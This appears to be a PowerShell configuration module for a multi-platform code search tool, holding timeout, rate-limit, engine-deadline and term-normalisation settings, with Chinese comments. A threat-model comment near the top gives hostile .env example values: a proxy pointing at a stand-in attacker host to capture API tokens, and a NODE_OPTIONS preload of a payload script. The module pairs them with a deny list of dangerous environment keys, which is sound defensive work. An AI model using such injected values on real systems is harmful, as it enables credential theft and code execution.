# ==============================================================================
# lib/config.ps1 -- Multi-Code-Platform Searcher | B3-2 模块拆分（v1.54.0）
#
# 配置与数据表：$script:Cfg、引擎注册表、主题词表、注入白名单、全局状态初始化。
#   本模块只有数据（无函数、无副作用）；书写顺序即依赖顺序，勿随意重排。
#   约束：这里的一切都在 .env 加载之前求值 => 不许出现 env 读取（否则 .env 里的配置会被忽略）。
#
# 契约：本文件只定义（函数 / $script: 数据），无顶层副作用；由主脚本按固定顺序点源加载。
#   · 作用域：点源进主脚本作用域，故 $script: 指向主脚本；版本号/参数等由主脚本提供。
#   · 不要在这里 exit、不要写 stdout：进度与产物分别走 Write-ColorOutput / Write-PayloadOutput。
#   · 新增函数放对应模块；跨模块调用无需前置声明（全部在运行前定义完毕）。
# ==============================================================================

#     `MCPS_PROXY=socks5://attacker:1080;api.github.com` ⇒ 带 Authorization 的请求走攻击者代理，令牌被截获；
#     `NODE_OPTIONS=--require ./payload.js` ⇒ TLS 兜底调用 node 时执行任意代码。
#   实测（审计原文）：临时目录 .env 写 MCPS_DISABLE=GitHub，从该目录跑 -Doctor 即生效（disabledEngines:["github"]）。
# 口径（三条，按"能否把流量/代码导向别处"划）：
#   ① 令牌键 —— cwd 与技能目录**都接受**：它只能让请求被拒，不能把流量导走；
#   ② MCPS_* 与 NO_PROXY —— **只接受技能目录**（那是用户自己的配置文件），cwd 一律忽略；
#   ③ 其余键（PATH / NODE_OPTIONS / PSModulePath / LD_PRELOAD / TEMP …）——**任何来源都拒绝**。
#   被拒的键不静默：计入返回值，由调用处汇总成一行提示。
$script:EnvTokenKeys = @(
    'GITHUB_TOKEN', 'GITLAB_TOKEN', 'GITEE_TOKEN', 'SRC_TOKEN', 'SOURCEGRAPH_TOKEN',
    'S2_API_KEY', 'SE_KEY', 'DEEPSEEK_API_KEY', 'MCPS_OPENALEX_API_KEY'
)
$script:EnvConfigKeys = @('NO_PROXY', 'no_proxy')
# v1.45.9（2026-10-20）：`.env` 存在但读不到时必须留痕。此前 `catch { }` 把读失败吞成"没配"，
#   9 个令牌静默消失而 CLI 一个字都不提（Doctor 只显示 Present=false，与"未配置"不可区分）。
$script:EnvLoadErrors = @()
# ---------- U-15（2026-09-26）：Cfg 前移 ----------
# 原位于令牌桶/重试预算之后（约 L388）；U-15 把 _retryBudget / ghSearchRate / 令牌提示等顶层求值改读 Cfg 后，
# Cfg 必须先于这些顶层语句定义。块内只有字面量与注释，不依赖任何前置变量，前移零语义变化。
# L1（v1.20.0）：魔法数字集中配置——超时/预览长度/重试参数等全局常量收敛于此，
# 函数一律经 $script:Cfg 引用（并发 Runspace 由 _injectVars 白名单注入）。
$script:Cfg = @{
    PreviewLen        = 200   # 结果预览最大字符数
    # v1.38.0（U-168）：**代码证据远程端点 = 单一事实源**。引擎与 `-Doctor` 探活必须引用同一个值。
    #   病灶（2026-10-06 实测）：引擎改走官方 MCP 后，`-Doctor` 仍在探旧 REST `/api/search` ⇒
    #   同一份 Doctor 里 `remoteEngines` 报 grep.app `Reachable=false`、`remoteCodeSources` 却把它列为可用，
    #   自相矛盾且会让人误判 grep.app 挂了。根因就是"两处各写一份 URL"。此后只改这里。
    GrepAppMcpUrl     = 'https://mcp.grep.app/'
    # U-82（2026-09-26）：时长键一律带单位后缀（…Sec / …Ms）—— 此前 ApiTimeoutDefault / ApiTimeoutLong 与同族 ApiTimeoutSec 不一致；Node 门按 参数速查 的「单位」列守。
    ApiTimeoutDefaultSec = 15 # Invoke-ApiRequest 默认超时（调用方未指定）
    ApiTimeoutSec     = 20    # 研究/检索 API 常规超时
    ApiTimeoutLongSec = 25    # 长请求（S2 batch）超时
    MaxAttempts       = 3     # 单请求最大尝试次数
    RetryBaseSec      = 2     # 指数退避基数（base^attempt）
    # R4-F1（2026-10-04）：**代码证据路径**的单请求超时与尝试次数。
    #   ★必须满足不变式：CodeRequestTimeoutSec × CodeRequestMaxAttempts + 退避 ≤ EngineDeadlineCodeSec(17s)
    #   病灶（R4-0b 实测）：三处默认叠加 —— 单请求 15s（ApiTimeoutDefaultSec）× MaxAttempts=3 = **最坏 45s**，
    #   而引擎级截止只有 **17s** ⇒ 一次网络抖动就让引擎**必然以 deadline 死掉**、**重试根本来不及发生**
    #   ⇒ 唯一代码源偶发失败 ⇒ **整条代码证据通道 0 条**（`errors=["engines.GitHubCode:deadline"]`）。
    #   取值：6 × 2 + 退避(≤2) = **14s ≤ 17s**（留 3s 余量）⇒ 重试真正有机会发生，
    #   且**最坏时延反而从 45s 降到 14s**（降时延 + 提可用性，无取舍）。
    CodeRequestTimeoutSec  = 6
    CodeRequestMaxAttempts = 2
    # v1.53.2（T2-6 残余）：403 类失败里附带的**可执行替代清单**（单一事实源）。
    #   ★只列注册表里真实存在的 code 引擎 —— 方案表原本写"grep.app/searchcode"，核对后发现
    #     `searchcode` 在本仓不是独立 code 引擎（它只作为 -RepoScope 的仓库级源出现），照抄会给出不存在的建议。
    #   门 U-224 用「名字必须 ∈ 注册表 code kind」把这条钉死（写错引擎名即红）。
    CodeFallbackHint = '本轮其他 code 源仍可查：GitHubCode / GrepApp / GitLabBlobs（-CodeEvidence 用法不变）'
    RetryMinWaitSec   = 1     # Retry-After 最小等待秒数
    MaxRetryWaitSec   = 30    # Retry-After 最大等待上限（v1.28.1：超限快速失败，防 429 大 Retry-After 卡死）
    # 批次1动作2（2026-10-09）：GitLab **单查询调用预算**（硬上限）。
    #   事实（方案 §三，官方 rate-limit-change-2026）：10-19 起未认证 = 60 req/h/IP（现行 500/min 级，约 500 倍砍）；
    #     Free 认证 = 5,000/h（burst 100/min）。
    #   实测本引擎链最坏次数（未设预算时）：全局 blobs(1) + projects?search(1) + 逐项目 blobs(≤8) + 逐项目路径 GET(≤8) ≈ **18 次/查询**
    #     ⇒ 未认证配额下约 3 次查询即耗尽 60/h ⇒ GitLab 面实质不可用。
    #   语义：**每个 GitLab 引擎各自封顶**（repo 走 Search-GitLab，code 走 Search-GitLabBlobs），
    #     因为两者在 Runspace 池内各自独立执行、无法共享进程变量（见 Invoke-EnginePool L2812）。
    #   v1.45.2（2026-10-20 全量验收 P0-2）：2 → 4。实测默认 2 在回退路径下只够「403 + 一次项目搜索」
    #     或「一次 blobs」，项目搜索命中多个项目时必然 0 产出（keyword=agent：预算 2 ⇒ 0 条，预算 4 ⇒ 2 条）。
    #   逃生阀：$env:MCPS_GITLAB_MAX_CALLS（认证用户 5,000/h 可调高，如 10）。
    GitLabMaxCallsPerQuery = 4
    DoctorProbeSec    = 6     # -Doctor 健康探测单请求超时
    NetworkProbeTimeoutMs = 2500 # U-155：真实目标 URL 的 HEAD 与必要时 GET 各 2.5 秒
    # U-206（2026-10-21）：**逐域选路总预算**。旧行为是每个候选各 5s（HEAD 2.5 + GET 2.5），
    #   候选 3 个 ⇒ 单域最坏 15s > 引擎 10s 截止 ⇒ 用户只看到「单引擎超 10s 截止」，
    #   连"哪个路由死了、哪个域被白名单排除"都拿不到（实网：宿主 env 代理 127.0.0.1:50955 全超时）。
    #   4s 让第一个候选的结论（unknown）能在引擎截止前写进告警；=0 表示恢复"每候选各 2×2.5s"的旧行为。
    NetworkRouteBudgetMs = 4000
    # v1.51.0（Tier1-1）：**未证实路由的单次请求超时上限**。实测 HF 单轮 22.2s 全耗在"挂起在未证实路由上"
    #   （不是报错，是等到引擎截止才收尸）；8s 为下限保护 —— ≥ U-206 实测的 socks 冷启动 6s，不误伤慢代理。
    #   只对 ProbeState ≠ reachable 的路由生效；`MCPS_UNPROVEN_ROUTE_SEC=0` 关闭（恢复旧行为逐位不变）。
    UnprovenRouteRequestSec = 8
    # v1.53.7（Tier-1 §1 剩余项）：**代理网关 5xx 的进程内熔断**。
    #   Tier-1 方案原文给的处置是「1–2s 探测上限或进程内熔断（半开 60s）」；v1.51.0 只落地了 CONNECT 隧道失败
    #   （proxy-tunnel）的快速失败 —— 代理把 502 当**普通 HTTP 响应**返回时压根不进传输层分类器，照旧 5xx 退避重试。
    #   实测（2026-10-23 本机代理 127.0.0.1:22925）：GitHub 3 次尝试各 ~7s + 退避 ⇒ 独占 24s 后撞引擎 29s 截止，
    #   最终 reason 只剩「单引擎超 29s 截止」—— 用户既等满，又看不出是**代理**坏了。
    #   只认 502/503/504（网关类）：500 多为源侧异常（重试合理），429 有 Retry-After 语义（走限流路径）。
    ProxyBreakerOpenAfter = 2     # 同一主机**连续** N 次网关 5xx ⇒ 打开
    ProxyBreakerSec       = 60    # 打开时长；到期半开（放行一次探测），探测再失败立刻重开，成功则清零
    NodeDeadlineSec   = 25    # v1.34.1（v1.37.4 R-1 恢复）：node 引擎总时长硬截止（SSE 长流停连时到点收尾退出，杜绝挂死；-d 透传默认值）
    # v1.36.3（P1-6）：已知会偶发"连上但不回包"的慢源单请求超时（Maven Central solrsearch / MCP 官方注册中心）。
    # 实测 2026-09-24：search.maven.org 同一 URL 一次 0.14s、下一次 60s 无响应 ⇒ 默认 15s 超时让 Packages 引擎恒定拖满 15.5s，
    # 研究模式总时长呈 2.7s / 17s 双峰。
    SlowSourceTimeoutSec = 5   # 正常应答 0.1–0.3s，5s 足够
    # v1.36.4（修复 v1.36.3 遗漏）：慢源只试 1 次——v1.36.3 只设 5s 单次超时，外层 MaxAttempts=3 + 指数退避会放大到 ≈21s。
    # 注（订正）：v1.36.3 与本版早期把长尾归因于单个引擎（Maven / MCPRegistry）均不成立——见 EngineDeadlineSec 注释。
    SlowSourceMaxAttempts = 1
    # ★U-243（v1.53.25，验收 B1-7）：把「包注册表」拆成 npm / crates.io / Maven 三个独立引擎后，
    #   每个上游有自己的请求层超时。取值全部来自 2026-10-25 实测（同机、各 10 轮，见 06-实施记录-B1.md §B1-7）：
    #     · npm search      成功 0.85–3.04s（8/10），另 2 次是**整 15.01s 挂死**（TCP 层，非源侧错误码）
    #     · crates.io       0.53–1.14s（10/10）
    #     · Maven Central   0.65–1.97s（10/10，已有 SlowSourceTimeoutSec=5 单次）
    #     · npm 下载量补全   0.81–1.79s（7/10），另 3 次超 3s 挂死
    #   为什么必须分开给：旧实现三者共用一个引擎，且 npm 用 15s/20s 超时 + MaxAttempts=3
    #   ⇒ 一次 npm 挂死就把整引擎拖到 20.6s（独占 research 墙钟 94%），而 crates/Maven 早已返回。
    NpmSearchTimeoutSec   = 10   # npm search：3.3× 上包络，足以容忍抖动，又砍掉 15s 挂死
    # ★U-243 连带：arXiv 引用数富化（`Enrich-ArxivCitations`，S2 batch API）原本走 `ApiTimeoutLongSec=25` × MaxAttempts=3
    #   ⇒ **最坏 75s**，而它只是"给 arXiv 结果补一个 cited 数"。实测正常 3.5s。
    #   同一类缺陷（增强项占着主路径的预算）在 npm 下载量补全上刚刚修过一次，这里一并收口。
    ArxivEnrichTimeoutSec = 6    # 1.7× 实测值；配合 MaxAttempts=1 ⇒ 最坏 6s（原 75s）
    NpmDownloadTimeoutSec = 3    # 下载量补全：纯增强（失败保留 popularity 代理值），不配长超时
    # U-253（v1.53.26，2026-10-26）：下载量补全的**策略旋钮** —— 同一行代码承担两个相反目标，用开关而不是二选一。
    #   `fast`（默认）：主结果优先 —— search 用掉过半预算就跳过补全（B1-7 实测：npm search 十轮里 2 次挂满 15.01s，
    #     而补全只是给排序加 downloads 字段；为了它把主结果拖到超时，是拿"有结果"换"结果更好看"）。
    #   `full`：总是补全 —— 质量基线 / 评测类任务需要**完整字段**（缺 downloads 会让 relevance 排序口径漂移，
    #     那不是"少一个字段"，是"同一批结果换了顺序"）。
    #   ★实现方式刻意选"只改 $budgetSec 的含义（full ⇒ 无穷），守卫形态一字不动"：
    #     这样「主结果优先」这条契约在两种模式下都仍然存在（full 只是把预算设成无穷），
    #     门 U-243 的判据不需要放宽一个字符 —— 而"放宽判据"正是这类冲突最常见的错误收尾。
    #   环境变量 `MCPS_NPM_DOWNLOAD_POLICY=fast|full` 优先于本字段（评测脚本不必改 Cfg）。
    NpmDownloadPolicy     = 'fast'
    CratesTimeoutSec      = 8    # crates.io：7× 上包络（实测最大值 1.14s）
    # v1.36.4：单引擎级截止（仅研究路径启用）。宿主逐源计时（2026-09-24）：正常 0.7–4s；但网络经 SOCKS5 代理时
    # 个别源会打满自身超时，而「引擎最坏时长 = 其各子请求超时之和」（Packages = Maven 5s + npm 20s + crates 20s ≈45s；SE = 20s），
    # 无级内截止 ⇒ 整轮被单个卡住的源拖到 48s（实测 Packages 38.8s、SE 21.9s、聚合最高 47.8s）。
    # 超截止即 Stop 该引擎、保留已产出部分、标 error + warnings（口径同总时长预算）。
    # 注意：卡源时 verdict 会成为 degraded——这是诚实上报，不是回归（未改前是"静默等 48s 后仍报 full"）。
    # U-62/U-63 重定值（2026-09-27，据 U-87 两轮上包络 max(p95_1, p95_2) 分档，不机械套 ×1.5）：15 → 17。
    # A 档（超线 ≤1.10×）取 +10–15%，一次覆盖研究路径两个临界源（HF 15.22s、RubyGems 15.15s）；
    # 明显超线的三源（DockerHub / NuGet / arXiv）走下方 EngineDeadlineByEngine 单源放宽。
    EngineDeadlineSec = 17
    # v1.36.3（P1-8）：Gitee so API 相关度地板——关键词零命中（Rel=0）且 _score 低于绝对下限或低于榜首 _score 的比例时剔除。
    # 实测噪音 _score≈0.5–1.4（darknet×5 / Linux Lab），真实中文 desc 仓库 _score≈100（disjob），两档之间留足余量。
    GiteeMinApiScore   = 2.0
    GiteeRelFloorRatio = 0.25
    # U-15（T2-13，2026-09-26）：魔数全量入 Cfg。口径：只收"可调策略常数"；单位换算（*1000 ms）、编码页（28591）、
    # HTTP 状态码、Format-Table 列宽、param 默认值不算魔数。
    TimeBudgetDefaultSec = 120   # 单次运行总时长预算默认（MCPS_TIME_BUDGET_SEC 可覆盖；0=不限）
    # U-241（v1.53.24，验收 B1-2）：**整轮总预算**默认值（仅 -Auto）。0 = 不限。
    #   为什么需要它：`TimeBudgetDefaultSec` 是**每池**预算（Invoke-EnginePool 里每池各取一次），
    #   -Auto 顺序跑 3 个池 ⇒ 最坏 3×。45s = 健康态 Auto（拆 Packages + 健康记忆后约 10–12s）的 4 倍余量，
    #   既留出慢源空间，又把"最坏 6–12 分钟"钉在 45s。`MCPS_TOTAL_BUDGET_SEC` 可覆盖（0 = 关闭）。
    TotalBudgetAutoDefaultSec = 45
    # U-242（v1.53.24，验收 B1-1）：源健康记忆 —— 跨运行记住"上轮这个源不行"，
    #   下一轮只给它 HealthProbeSec 秒**半开探测**（不是跳过：跳过会让它从 Requested/Executed 消失，
    #   把"没试"伪装成"没问题"）。TTL 按失败类型分档，连续失败翻倍（见 Set-EngineHealthOutcome）。
    # ★探测预算不能太小：健康的 repo/code 源 p95 在 4–9s，给 1s 等于「永远探不活」⇒
    #   一次偶发超时会把源永久踢出去（实测：1s 探测下 Codeberg/GrepApp 必失败，失败计数翻倍 ⇒ TTL 越拉越长）。
    #   6s = 覆盖常态成功源，同时把 12–17s 的死源尾砍一半。
    HealthProbeSec   = 6     # 冷源半开探测预算（秒）；0 = 关闭健康记忆（同 MCPS_HEALTH=0）
    HealthTtlSec     = 600   # 网络类/截止类冷却起始 TTL（秒），连续失败翻倍，上限 1h
    HealthTtlQuotaSec = 900  # 配额类（402 余额不足）冷却 TTL（秒）
    RetryBudget          = 6     # 进程级重试预算（研究模式多源批量时防重试长尾累积）
    GhSearchRateAnonPerMin = 10  # GitHub Search 令牌桶：未认证 10/min
    GhSearchRateAuthPerMin = 30  # GitHub Search（repo）令牌桶：认证 30/min
    GhCodeSearchRatePerMin = 10  # U-43（N-20）：GitHub **code** search 独立桶 —— 宿主 2026-09-26 实测 X-RateLimit-Limit=10（带 token 亦 10/min，2023-03 changelog 已拆分），此前误用 30/min 桶会自伤 403 二次限流
    # U-160 L4（2026-10-03）：**客户端速率 = 观测限值 × (1 − 本比例)** —— 即预留 15–20% headroom。
    #   ★观测限值常量（上面三个）**不改**：它们是「服务端实测允许多少」的锚点（U-43 据此断言 code search 用 10 而非 30）；
    #     本比例管的是「我们敢用多少」。两者是不同东西 —— headroom 防的是「贴着上限跑 ⇒ 突发越界 ⇒ 429 雪崩」。
    RateLimitHeadroomRatio = 0.2
    GiteeSoPageMin       = 20    # so.gitee.com widget 每页下限
    GiteeSoPageMax       = 50    # so.gitee.com widget 每页上限
    GhCodeOverfetchFactor = 3    # GitHub code search 多取倍数（客户端把源码排到文档前再截断）
    GhCodeOverfetchMax   = 30    # GitHub code search 多取上限
    NpmPopularityScale   = 10000 # npms.io popularity(0–1) → 整数展示的放大倍数
    # P1（2026-10-19）：4 → 6。并行探针共享同一个本机代理 ⇒ 单源延迟被放大（实测 4 路下 MCP Registry /
    #   Maven 偶发撞 4s 上限，报 timeout 而源本身健康）。6s 给排队留余量；仍是**请求层总预算**（路由+主请求+兜底共享）。
    DoctorResearchProbeSec = 6   # U-13：-Doctor 研究信源健康探测单源超时（与 DoctorProbeSec 取小）
    # P1（2026-10-19）：研究探针并发度。默认 4 —— 与批模式同值（实测 8 路并发时本机代理排队，
    #   单源延迟被放大到 4s 上限 ⇒ 出现"并行把好源挤成 timeout"的自造假红；4 路下 14 源 4 波 ≈ 8–12s）。
    DoctorParallelism = 4
    # U-23（T3-2）：超时/预算配置化 —— 引擎级截止可按引擎覆盖（键 = 注册表 Name；缺省沿用 EngineDeadlineSec）。
    # 根治"引擎最坏 = 子超时之和"：截止由池按引擎查表，慢源引擎可单独收紧，不必全局一刀切。
    # U-62（2026-09-26 首置，据 U-61 正式 10 轮）：研究路径 p95 超全局 15s 的三源单独放宽（旧口径 max(ceil(p95×1.5), 10)，
    # 首次取偏大侧；观测者效应：测量时全局 15s 截止已生效，被截断引擎的 EngineMs 是池侧回填值 ⇒ 旧 p95 只会被低估）。
    # U-62/U-63 重定值（2026-09-27，据 U-87 两轮上包络复核，**不机械套 ×1.5**）——按「超线倍数」分档：
    #   A 档（≤1.10×，只差一点点）取 +10–15%；B 档（>1.20×，差得多）取 ≈1.4×上包络（或明确接受截断，截断会记 degraded，不静默）。
    #   A 档：Packages 25.22s（1.009×）→ 28（+11%）；默认 EngineDeadlineSec 15→17 同档覆盖 HF 15.22s / RubyGems 15.15s。
    #   B 档：DockerHub 20.16s（1.34×）→ 29；NuGet 18.78s（1.25×）→ 27；arXiv 18.19s（1.21×）→ 26（均 ≈1.4×p95）。
    #   SE 25 / HackerNews 22 保留不动（未超线：上包络 15.03s / 16.91s）。
    # v1.41.0（2026-10-17 实测重定值）：原表按「超线倍数」给到 22–29s，实测整体耗时 = 最慢源，
    #   而 5 个源三次全 0 产出（HF/MCPRegistry/NuGet/RubyGems/SE）⇒ 零产出源压到 8s；
    #   有产出的慢源（Packages 仅 crates.io 子源有产出、DockerHub）给 15s；arXiv/HackerNews 通常 2–4s 完成，给 12s。
    # v1.42.0（2026-10-18 O-3）：**单源硬上限**（秒）。任一源执行超过此值即 Stop，不等全局 deadline。
    #   病灶（10-17 体检）：三次 research 25.8/24.7/30.7s 全由最慢源决定（Packages 23–28s，只贡献 crates.io 10 条）。
    #   与 EngineDeadlineByEngine 的关系：**取 min** —— 该表仍表达"该源值得等多久"（U-62/U-63 两轮上包络），
    #   本 cap 是**全局上限**（0=关闭）。MCPS_ENGINE_HARD_CAP_SEC 可覆盖。
    # v1.47.9（2026-10-22）：默认 10 → **0（关闭）**。理由不是"想更慢"，而是**默认值互相矛盾**：
    #   v1.47.5/6 的自检证明 cap=10 把 21 个引擎里的 17 个夹住 ⇒ `EngineDeadlineByEngine` 里
    #   22–29 的实测值、`EngineDeadlineRepoSec=29` 在单模式下**从来没有生效过**（表形同虚设）。
    #   两条证据（reports/实验-截止上限与预算-2026-10-22.md，n=2 同查询）：cap=0 ⇒ 18→25 条（+39%）、
    #   deadline 3→1、墙钟 +2–4s（15.7→17.4s）；cap 放开后逐源表自动生效，无需再写 MCPS_ENGINE_DEADLINE。
    #   最坏面仍被封顶：单模式最慢源 Packages 28s / DockerHub 29s，且 `MCPS_TIME_BUDGET_SEC` 仍在。
    #   要恢复旧行为：`MCPS_ENGINE_HARD_CAP_SEC=10`（旋钮未删）。`-Auto` 走 EngineHardCapMultiModeSec=25，不受本键影响。
    EngineHardCapSec = 0
    # v1.45.2（2026-10-20 全量验收 P0-1）：`-Auto` 一次进程跑 repo+code+research 三组引擎，并发叠加后
    #   单源 10s 普遍不够（实测 -Auto "jwt"：HF/Packages/DockerHub/MCPRegistry/SE 全 deadline，
    #   而单模式 research 的 HF 能出 15 条）。多模式下改为「按引擎截止 ×Factor，cap 取本键」；
    #   单模式行为逐位不变；MCPS_ENGINE_HARD_CAP_SEC 仍可一票覆盖。
    EngineHardCapMultiModeSec = 25
    MultiModeTimeScale = 2.5
    # ★U-243（v1.53.25）：`Packages = 28` 三项拆开。28 是给「一个引擎内串行跑三个上游」的预算，
    #   拆开后每个上游各自成表项，按**各自实测**定值（不再按最慢子源一刀切）：
    #     · Npm    = 13：search 10s 为上限；下载量补全另有"search 超 7s 就跳过"的守卫（见 npm-registry.ps1）
    #                 ⇒ 理论最坏 10s。**但实测池内（14 引擎并发）到过 11.17s** —— 11s 会把 5 条 npm 主结果一起砍掉
    #                 （v1.53.25 试投时第 1 轮 results 28→23 就是这么丢的）。13s = 实测最坏 + 1.8s 余量，
    #                 仍远低于原 Packages 的 28s；-Auto 侧还有 45s 总预算兜底。
    #     · Crates = 10：实测 0.53–1.14s，10s 已含 8 倍余量
    #     · Maven  = 8 ：实测 0.65–1.97s，且内部另有 SlowSourceTimeoutSec=5 × 1 次
    #   ★这三个值低于旧的 28 是**刻意的**：单源挂死本该只牺牲它自己，不该占用别人的时间。
    EngineDeadlineByEngine = @{ Npm = 13; Crates = 10; Maven = 8; DockerHub = 29; arXiv = 26; HackerNews = 22; SE = 25; NuGet = 27; RubyGems = 8; HF = 8; MCPRegistry = 8; OpenAlex = 8 }
    # U-17（T1-4）：code / repo 路径的引擎级截止。0 = 关（与 v1.37.7 行为逐位相同）。**先测 p95 再改**：
    # 宿主用 `-Platform All -AsJson` 跑 ≥10 轮取各引擎 LatencyMs p95，再按 U-87 分档口径（A 档 +10–15% / B 档 ≈1.4×上包络）置非 0。
    # U-63（2026-09-26 首置）：按正式 10 轮置值 —— code 路径 p95 7.1–9.4s ⇒ 15；repo 路径 p95 17.3s（Codeberg 15.1s、Gitee 10.9s）⇒ 26。
    # U-63 重定值（2026-09-27，据 U-87 两轮上包络，A 档 +10–15%）：code 最慢源 GitHubCode 上包络 15.03s（1.002×）⇒ 15→17（+13%）；
    #   repo 最慢源 Codeberg 上包络 26.16s（1.006×）⇒ 26→29（+11%）。此前 0 = 关。
    EngineDeadlineCodeSec = 17
    EngineDeadlineRepoSec = 29
    # U-200（2026-10-21）：**慢源告警阈值**。引擎用时 ≥ 该值且有产出 ⇒ 进 warnings（Verdict 不变）。
    #   实测动机：hex.pm 17.4s / pub.dev 9.6–14.5s / OSV 16.7–21.6s 这类源会把整轮拖长，但报告里只有"总耗时"，
    #   看不出是谁拖的；而把它们直接判 degraded 又会把"慢"说成"不可信"（慢 ≠ 错）。故只标注、不改判。
    #   MCPS_SLOW_ENGINE_MS=0 关闭；单测用较小值即可覆盖。
    SlowEngineWarnMs = 8000
    # v1.46.3：`-Package`（deps.dev 精确包元数据）—— 生态别名 → deps.dev 的 system 名。
    #   只收 deps.dev 确有数据的六个（实测 2026-10-20 全部 200）；新增生态必须先用真实包验 200 再进表。
    DepsDevSystems = @{ npm = 'NPM'; pypi = 'PYPI'; cargo = 'CARGO'; go = 'GO'; maven = 'MAVEN'; nuget = 'NUGET' }
    #   单包两请求（包 → 默认版本详情）实测 0.3–2.7s；给 12s 留足抖动余量（不做重试：这是查询，不是抓取）。
    DepsDevTimeoutSec = 12
    #   一次 -Package 最多查多少个（逗号分隔）。超过即截断并告警 —— 不做静默丢弃。
    DepsDevMaxSpecs = 10
    # 批次3 · 3-2a（2026-10-09）：**`-ies` 例外表**（`-ie` 词干加 s 构成的名词）。
    #   规则默认 `-ies → -y`（queries→query / libraries→library / dependencies→dependency）；
    #   但 movies/cookies/series 这类是 `-ie`(+s)，强行 `→y` 会得到 movy/sery ⇒ 与 movie 断开。
    #   命中即改用 `-ies → -ie`（去尾 s）。刻意**只收技术检索语境里真会出现的词**，宁缺毋滥。
    IesExceptionTerms = @('movies','cookies','zombies','series','species','brownies','rookies')
    # 批次3 · 3-2c（2026-10-09）：**别名动词表**（原形 → 规范形）。
    #   依据：A2 §3.1 —— 查询与正文常分别用「取 / 删除 / 列举」的不同动词表达同一动作，词面不同却语义等价。
    #   口径（三条缺一不可）：
    #     ① 只收**单义动作动词**；泛词（do/make/use/create/run/handle）**不入表** —— 它们在任何词表里都会放大噪声；
    #     ② 只收**原形**：变位（fetches / fetching / retrieved / removing）不映射，宁缺毋滥（表 ≤60 条起步）；
    #     ③ 每组第一个词即规范形，映射后**两侧同源**（查询与正文都过 Normalize-MatchText），不做子串匹配。
    #   与 LowDiscriminationTerms 的区别：那张表只**告警**，本表**真的改变归一结果**（故必须进同源门基线）。
    VerbAliasCanonical = @{
        'fetch' = 'get'; 'retrieve' = 'get'; 'obtain' = 'get'
        'remove' = 'delete'
        'enumerate' = 'list'
    }
    # 批次3 · 3-2b / E-3b（2026-10-17）：**短语 → 缩写 规范形**（两侧同源；只影响命中判定，**不改发往平台的请求**）。
    #   病灶（A-9 实测）：查询「retrieval augmented generation」与正文「RAG system」语义等价却**词面无桥** ⇒ rel=0（假阴）。
    #   做法：在 Normalize-MatchText 的**逐词归一之前**整条替换为缩写（带左右词边界，避免 storage 里的 "rag" 子串误配）。
    #   口径：只收**低歧义 + 技术检索语境**的全称；≤60 条起步（照 3-2c 的宁缺毋滥）；**单复数各收一条**（复数靠去尾 s 无法回到短语）。
    AbbrevPhraseMap = @{
        'retrieval augmented generation'       = 'rag'
        'large language model'                 = 'llm'
        'large language models'                = 'llm'
        'application programming interface'    = 'api'
        'command line interface'               = 'cli'
        'object oriented programming'          = 'oop'
        'relational database management system'= 'rdbms'
        'extract transform load'               = 'etl'
    }
    # U-121（S1，2026-09-28）：低区分度词表 —— 关键词含这些词时 Top-N 易被泛项占满（r61 W1-q2 `serialization`、W5 `benchmark` 撞词实测）。
    # 只告警不改行为：进 warnings[]（[query] 前缀）+ 非 AsJson 时提示一行。加词：小写；英/美拼写都列。
    LowDiscriminationTerms = @('marketplace','spec','specification','standard','standards','serialization','serialisation','benchmark','benchmarks','framework','library','tool','tools','example','examples','demo','template','boilerplate','awesome','plugin','api','sdk','guide','tutorial','best','practices')
    # U-113（2026-09-28）：-MinStars 分档阈值 —— ≥ 此值为「高门槛档」；高门槛 + 低区分度词 ⇒ 警告（r60 W4 默认 100 得 0 命中、-MinStars 0 得 4/4 的根因）。
    MinStarsHighThreshold = 100
    # U-125（2026-09-28）：令牌到期告警阈值（天）——-Doctor 对可判到期日的令牌（GitHub 响应头 / MCPS_TOKEN_EXPIRES 登记）剩余 ≤ 此值 ⇒ 告警。
    TokenExpiryWarnDays   = 7
}
# v1.23.0 P1-5c：引擎降级/失败警示收集（warnings[] 契约）。
# 背景：P0 可观测化后引擎失败会标 error/auth_missing/tool_missing，但"fallback 动作本身"（谁→谁的降级路径、为什么）
#       仍无声——计划 #5c 要求任何引擎 fallback 进 warnings[]，不再"无声兜底"。
# 并发安全：ConcurrentQueue 跨 Runspace 追加（与 _engineStatus 同模式）；主流程 EndInvoke 后集中读取。
$script:_engineWarnings = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
# U-61（Wave C，2026-09-26）：每引擎耗时（ms）—— 由 Runspace 内包装脚本写入（引用类型跨 Runspace 共享），
# 供 `-AsJson` 的 `metrics.EngineMs` 与 p95 harness（reports/gates/measure-latency.ps1）消费；此前只有总 ElapsedMs，无法定 U-17/U-62 的阈值。
$script:_engineTimings = [System.Collections.Concurrent.ConcurrentDictionary[string,int]]::new()
# v1.53.0（U-223）：MCPS_ENGINE_DEADLINE 解析缓存 —— Get-EngineDeadlineOverride 现随 GrepApp 的 Needs
#   进引擎 Runspace（Get-CodeRequestBudget 要用它），缓存变量必须注入；顶层声明同时满足 U-53 的
#   「_injectVars 项必须有顶层定义」检查。Runspace 内是**副本**，各自重解析一次（缓存语义不受影响）。
$script:_engineDeadlineOverride = $null
$script:_engineDeadlineOverrideRaw = ''
# U-241：本轮总预算（见 Get-TotalBudgetSec / Get-RunRemainingSec）。
#   _runBudgetSw 为 $null = 还没开始计时（Doctor/纯静态路径不启动它 ⇒ 不会把 Doctor 的展示值夹小）。
$script:_runBudgetSw = $null
$script:_totalBudgetRaw = ''
$script:_totalBudgetVal = -1
# U-242：源健康记忆（延迟加载；_healthDirty 只在有变化时落盘）
$script:_healthStore = $null
$script:_healthStoreLoaded = $false
$script:_healthDirty = $false
# ★U-244（v1.53.26，验收 B1-3）：每个引擎补 `Host` = **该引擎实际请求的主机名**（一个引擎 = 一个上游，见 U-243）。
#   用途只有一个：`-Doctor` 的 `proxyCoverage` 矩阵据此判断「这个域会不会被 MCPS_PROXY 白名单排除 / 是否被本机 hosts 劫持」。
#   ★**不要**把它当路由来源 —— 真实选路仍由 Get-NetworkCandidates 按 URL 逐域决定，本字段只用于诊断展示（只读）。
#   漏填的后果不是静默：U-244 门要求「注册表里每个引擎都有 Host，且该主机名在其 engines/*.ps1 里逐字出现」。
$script:_engineRegistry = @(
    @{ Name = 'GitHub';      Kind = 'repo'; Platforms = @('GitHub'); Host = 'api.github.com';       Func = 'Search-GitHub';      Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Wait-RateLimitToken','Get-StaleCacheResult','Get-Cache','Add-EngineWarning','Get-GitHubStaleFallback','New-EngineEnvelope') },
